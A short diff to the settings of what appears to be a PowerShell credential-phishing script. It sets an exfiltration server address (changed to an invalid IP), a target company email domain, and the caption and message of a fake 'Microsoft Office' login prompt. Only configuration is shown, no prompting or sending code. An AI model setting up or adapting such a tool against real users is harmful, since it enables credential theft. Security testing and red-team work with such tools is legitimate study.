@@ -1,9 +1,9 @@
 # exfil address
-$exfilServer = "192.168.56.112"
+$exfilServer = "192.168.99.999"
 
 # prompt
 $targetUser = $env:username
-$companyEmail = "blackhillsinfosec.com"
+$companyEmail = "optiv.com"
 $promptCaption = "Microsoft Office"
 $promptMessage = "Connecting to: $targetUser@$companyEmail"
 $maxTries = 1 # maximum number of times to invoke prompt
